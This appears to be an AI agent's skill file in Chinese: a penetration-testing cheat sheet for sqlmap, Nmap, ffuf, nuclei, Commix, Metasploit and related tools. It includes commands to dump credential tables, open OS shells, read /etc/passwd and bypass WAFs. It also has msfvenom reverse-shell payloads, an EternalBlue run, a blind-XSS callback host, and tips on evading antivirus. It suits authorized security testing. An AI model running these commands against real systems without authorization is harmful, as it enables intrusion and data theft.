---
name: web-security
description: Web安全测试工具链 — sqlmap, Nmap, Nikto, XSStrike, ffuf, nuclei, Metasploit
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [web-security, penetration-testing, sql-injection, xss, nmap, reconnaissance, exploitation]
---

# Web安全测试工具链

## 核心工具一览

### 信息收集
| 工具 | 用途 |
|------|------|
| **Nmap** | 端口扫描/服务识别 |
| **whatweb** | Web指纹识别 |
| **wafw00f** | WAF检测 |
| **subfinder** | 子域名枚举 |
| **httpx** | HTTP探测 |
| **theHarvester** | 邮箱/子域名/IP收集 |

### 漏洞扫描
| 工具 | 用途 |
|------|------|
| **Nikto** | Web服务器漏洞扫描 |
| **nuclei** | 模板化漏洞扫描 |
| **ZAP** | OWASP Web安全扫描器 |
| **katana** | 新一代Web爬虫 |
| **dalfox** | XSS扫描器 |
| **dnsReaper** | DNS子域名接管检测 |

### 漏洞利用
| 工具 | 用途 |
|------|------|
| **sqlmap** | SQL注入自动化 |
| **XSStrike** | XSS检测/利用 |
| **Commix** | 命令注入检测 |
| **Metasploit** | 渗透测试框架 |
| **smuggler** | HTTP请求走私检测 |
| **Fenjing** | SSTI模板注入检测 |
| **arjun** | HTTP参数发现 |

### Fuzzing
| 工具 | 用途 |
|------|------|
| **ffuf** | 快速Web Fuzzer |
| **wfuzz** | Web应用Fuzzer |
| **dirsearch** | 目录/文件扫描 |
| **gobuster** | 目录/DNS暴力枚举 |
| **feroxbuster** | 递归目录扫描 |

---

## 1. Nmap — 网络扫描之王

### 安装
```bash
sudo apt install nmap
```

### 扫描命令
```bash
nmap -T4 -F 192.168.1.1                    # 快速扫描常用端口
nmap -p- -T4 192.168.1.1                    # 全端口
nmap -sV -sC -p 80,443,22 192.168.1.1       # 服务版本+脚本
nmap -A -T4 192.168.1.1                      # 全面扫描
nmap -sU -T4 --top-ports 100 192.168.1.1     # UDP扫描
nmap -sn 192.168.1.0/24                      # 主机发现

# 脚本扫描
nmap --script vuln 192.168.1.1
nmap --script=http-enum 192.168.1.1
nmap --script=ssl-heartbleed -p 443 192.168.1.1
nmap --script=smb-vuln* -p 445 192.168.1.1

# 输出
nmap -oA output 192.168.1.1
nmap -oX output.xml 192.168.1.1
```

---

## 2. sqlmap — SQL注入神器

### 安装
```bash
sudo apt install sqlmap
# 或最新版 (v1.10):
git clone https://github.com/sqlmapproject/sqlmap.git
```

### 基本用法
```bash
# GET参数
sqlmap -u "http://target.com/page?id=1"

# POST请求
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Cookie注入
sqlmap -u "http://target.com/page" --cookie="session=abc123"

# 从Burp请求文件
sqlmap -r request.txt

# 注入技术
sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ
# B=Boolean E=Error U=Union S=Stacked T=Time Q=Inline
```

### 数据库操作
```bash
sqlmap -u "URL" --dbs                           # 列数据库
sqlmap -u "URL" -D mydb --tables                # 列表
sqlmap -u "URL" -D mydb -T users --columns      # 列字段
sqlmap -u "URL" -D mydb -T users --dump          # 导出数据
sqlmap -u "URL" -D mydb -T users -C username,password --dump
sqlmap -u "URL" --current-user
sqlmap -u "URL" --current-db
sqlmap -u "URL" --is-dba
```

### 高级功能
```bash
# OS Shell (需DBA)
sqlmap -u "URL" --os-shell

# SQL Shell
sqlmap -u "URL" --sql-shell

# 读文件
sqlmap -u "URL" --file-read="/etc/passwd"

# 绕过WAF
sqlmap -u "URL" --tamper=space2comment,between,randomcase
sqlmap -u "URL" --random-agent --delay=1

# 常用tamper
--tamper=space2comment      # 空格->注释
--tamper=between            # >->BETWEEN
--tamper=charencode         # 字符编码
--tamper=randomcase         # 随机大小写
--tamper=equaltolike        # =->LIKE

# Level/Risk提高
sqlmap -u "URL" --level=5 --risk=3

# 批量扫描
sqlmap -m urls.txt --batch
```

---

## 3. ffuf — 高速Fuzzer

### 安装
```bash
wget https://github.com/ffuf/ffuf/releases/latest/download/ffuf_2.1.0_linux_amd64.tar.gz
tar xzf ffuf_*.tar.gz && sudo mv ffuf /usr/local/bin/
```

### 目录扫描
```bash
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt,.js
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404       # 过滤404
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403  # 匹配
ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 4242      # 过滤大小
ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2
ffuf -u http://target.com/FUZZ -w wordlist.txt -H "Authorization: Bearer token"
ffuf -u http://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080
```

### 子域名爆破
```bash
ffuf -u http://FUZZ.target.com -w subdomains.txt -mc 200,301,302
```

### 参数Fuzzing
```bash
ffuf -u "http://target.com/page?FUZZ=test" -w params.txt -mc 200
ffuf -u http://target.com/login -X POST -d "FUZZ=admin" -w params.txt
ffuf -u http://target.com/ -w headers.txt -H "FUZZ: 127.0.0.1"
```

### Virtual Host发现
```bash
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -mc 200 -fs 0
```

---

## 4. nuclei — 模板化漏洞扫描

### 安装
```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@v3.8.0
nuclei -update-templates
```

### 基本用法
```bash
nuclei -u http://target.com                    # 扫描单目标
nuclei -l urls.txt                             # 扫描列表
nuclei -u http://target.com -t cves/           # 指定模板
nuclei -u http://target.com -severity critical,high  # 严重级别
nuclei -u http://target.com -tags cve,xss,sqli      # 标签
nuclei -u http://target.com -as                  # 自动模板选择
nuclei -u http://target.com -c 25 -rl 100      # 并发控制
nuclei -u http://target.com -o results.txt      # 输出
```

### 模板类别
```bash
nuclei -t cves/                    # CVE漏洞
nuclei -t vulnerabilities/         # 通用漏洞
nuclei -t misconfiguration/        # 配置错误
nuclei -t exposures/               # 信息泄露
nuclei -t default-credentials/     # 默认凭据
nuclei -t http/                    # HTTP协议模板
nuclei -t code/                    # 代码审计模板
```

---

## 5. XSStrike — XSS检测

### 安装
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike && pip install -r requirements.txt
```

### 用法
```bash
python xsstrike.py -u "http://target.com/page?q=test"
python xsstrike.py -u "http://target.com/search" --data "q=test"
python xsstrike.py -u "http://target.com/page?q=test" --skip
python xsstrike.py -u "http://target.com/page?q=test" --cookie "session=abc"
python xsstrike.py -l urls.txt
```

---

## 6. Commix — 命令注入

### 安装
```bash
git clone https://github.com/commixproject/commix.git
```

### 用法
```bash
python commix.py -u "http://target.com/ping?ip=127.0.0.1"
python commix.py -u "http://target.com/exec" --data "cmd=whoami"
python commix.py -u "http://target.com/" --cookie "lang=en;id=1"
python commix.py -u "http://target.com/ping?ip=127.0.0.1" --batch
python commix.py -r request.txt
```

---

## 7. Nikto — Web服务器扫描

```bash
sudo apt install nikto

nikto -h http://target.com
nikto -h target.com -p 8080
nikto -h target.com -ssl -port 443
nikto -h target.com -o report.html -Format html
nikto -h target.com -useproxy http://127.0.0.1:8080
```

---

## 8. 信息收集

### whatweb
```bash
sudo apt install whatweb
whatweb target.com
whatweb -v target.com
whatweb -a 3 target.com
```

### wafw00f
```bash
pip install wafw00f
wafw00f target.com
wafw00f target.com -a
```

### subfinder + httpx
```bash
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest

subfinder -d target.com -silent | httpx -silent
```

### theHarvester
```bash
sudo apt install theharvester
theHarvester -d target.com -b google,bing,linkedin
theHarvester -d target.com -b all -l 500
```

---

## 9. Metasploit — 渗透框架

### 安装
```bash
sudo apt install metasploit-framework
sudo msfdb init
```

### 基本用法
```bash
msfconsole

# 搜索
msf6> search type:exploit platform:windows
msf6> search eternalblue

# 使用
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> show options
msf6> set RHOSTS 192.168.1.100
msf6> set LHOST 192.168.1.1
msf6> run

# 生成payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf > shell.elf
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -o shell.apk

# Handler
msf6> use exploit/multi/handler
msf6> set payload windows/meterpreter/reverse_tcp
msf6> set LHOST 192.168.1.1
msf6> set LPORT 4444
msf6> run
```

---

## 10. 渗透测试流程

```
1. 信息收集
   ├── Nmap端口扫描
   ├── whatweb指纹识别
   ├── katana爬虫
   ├── subfinder子域名枚举
   ├── wafw00f WAF检测
   └── theHarvester邮箱/IP收集

2. 漏洞扫描
   ├── Nikto Web服务器扫描
   ├── nuclei模板化扫描
   ├── ffuf目录爆破
   ├── arjun参数发现
   └── ZAP应用扫描

3. 漏洞利用
   ├── sqlmap SQL注入
   ├── dalfox / XSStrike XSS
   ├── Commix命令注入
   ├── Fenjing SSTI模板注入
   ├── smuggler HTTP走私
   └── Metasploit漏洞利用

4. 后渗透
   ├── 权限提升
   ├── 横向移动
   ├── 数据提取
   └── 持久化
```

### Web渗透检查清单
```
[ ] 端口扫描 (Nmap)
[ ] Web指纹 (whatweb)
[ ] WAF检测 (wafw00f)
[ ] 目录扫描 (ffuf)
[ ] 子域名枚举 (subfinder)
[ ] SQL注入 (sqlmap)
[ ] XSS测试 (XSStrike)
[ ] 命令注入 (Commix)
[ ] 文件上传测试
[ ] 文件包含 (LFI/RFI)
[ ] SSRF测试
[ ] CSRF测试
[ ] IDOR测试
[ ] 认证绕过
[ ] 敏感信息泄露
[ ] 默认凭据
```

---

## Pitfalls

1. **sqlmap被WAF拦截** — --tamper + --random-agent + --delay
2. **ffuf过滤写反** — -fc 过滤, -mc 匹配
3. **Nmap太慢** — -T4 或 --top-ports
4. **nuclei模板过期** — nuclei -update-templates
5. **Hydra被ban** — -t 4 限速
6. **sqlmap跑太慢** — --threads=10
7. **XSStrike误报** — 手动验证payload
8. **Metasploit payload被杀** — 编码/加壳
9. **忘记代理** — 测试务必走ZAP/Burp
10. **未授权扫描违法** — 必须有书面授权

---

## 11. 新增工具速查

### katana — 新一代Web爬虫 (ProjectDiscovery)
```bash
go install github.com/projectdiscovery/katana/cmd/katana@latest
katana -u http://target.com -d 3 -jc          # 深度3 + JS解析
katana -u http://target.com -f url -ef png,jpg,gif  # 只输出URL,排除图片
katana -u http://target.com -xhr               # 只抓XHR请求
```

### dalfox — XSS扫描器
```bash
go install github.com/hahwul/dalfox/v2@latest
dalfox url "http://target.com/page?q=test"     # URL模式
dalfox file urls.txt                            # 批量扫描
dalfox url "http://target.com/page?q=test" --blind "http://your.xss.ht"  # 盲XSS
```

### dnsReaper — DNS子域名接管检测
```bash
git clone https://github.com/punk-security/dnsReaper.git && cd dnsReaper
pip install -r requirements.txt
python3 main.py --filename domains.txt        # 批量检测
python3 main.py single target.com             # 单域名
```

### smuggler — HTTP请求走私检测
```bash
git clone https://github.com/defparam/smuggler.git && cd smuggler
python3 smuggler.py -u http://target.com
python3 smuggler.py -u http://target.com -q     # 安静模式
```

### Fenjing — SSTI/模板注入检测
```bash
pip install fenjing
fenjing scan --url "http://target.com/page?name=test"
fenjing crack --url "http://target.com/page" --method POST --data "name=test"
```

### arjun — HTTP参数发现
```bash
pip install arjun
arjun -u http://target.com/page               # GET参数发现
arjun -u http://target.com/page -m POST       # POST参数
arjun -u http://target.com/page -m JSON       # JSON参数
arjun -u http://target.com/page --wordlist params.txt  # 自定义字典
```
